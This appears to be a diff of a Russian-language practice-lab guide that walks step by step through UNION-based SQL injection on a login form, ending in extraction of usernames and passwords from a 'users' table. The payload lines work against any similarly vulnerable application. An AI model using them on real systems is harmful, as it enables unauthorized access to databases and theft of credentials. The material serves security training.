@@ -32,13 +32,17 @@ container). После открытия главной страницы прил
 	1)  Проверим наличие уязвимости к SQL инъекциям. (Ввести символ ' в поле Username, чтобы увидеть сообщение об ошибке);
 	2)  Написать вилидный SQL запрос (чтобы не было сообщения об SQL ошибке, например a' or '1' = ' )
 	3)  Подбираем количество столбцов с помощью чисел: 
+	
     	a' union select 1 from information_schema.TABLES where '1' = '1' or '1' = '
     	a' union select 1,2 from information_schema.TABLES where '1' = '1' or '1' = '
     	a' union select 1,2,3 from information_schema.TABLES where '1' = '1' or '1' = '
+    	
   4)  Попробовать узнать прочую информацию:
+    	
     	a' union select 1,version(),3 from users where '1' = '1' or '1' = '
     	a' union select 1,user(),3 from users where '1' = '1' or '1' = '
     	a' union select 1,database(),3 from users where '1' = '1' or '1' = '
+	
 	5)  Зная название базы узнаем названием таблиц в ней:
 	    a' union SELECT 1,TABLE_NAME,3 from information_schema.TABLES WHERE TABLE_SCHEMA = 'md5practise' or '1' = '
   6)  Теперь надо узнать имена столбцов:
@@ -46,6 +50,7 @@ container). После открытия главной страницы прил
 	7)  Пытаемся получить содержимое таблицы users: 
 	    a' union select 1,2,3 from users where '1' = '1' or '1' = '
 	8) Теперь можно достать информацию из базы о пользователе: 
+    	
     	a' union select 1,nick,3 from users where '1' = '1' or '1' = '
     	a' union select 1,username,3 from users where '1' = '1' or '1' = '
     	a' union select 1,password,3 from users where '1' = '1' or '1' = '
@@ -53,6 +58,7 @@ container). После открытия главной страницы прил
 	Прочие примеры:
 	
 	    Можно экспериментировать с условиями:
+    	
     	a' union select 1,username,3 from users where id_user = 1 or '1' = '
     	a' union select 1,username,3 from users where id_user = 1 or true -- 
     	a' union select 1,username,3 from users where id_user = 1 or true --  
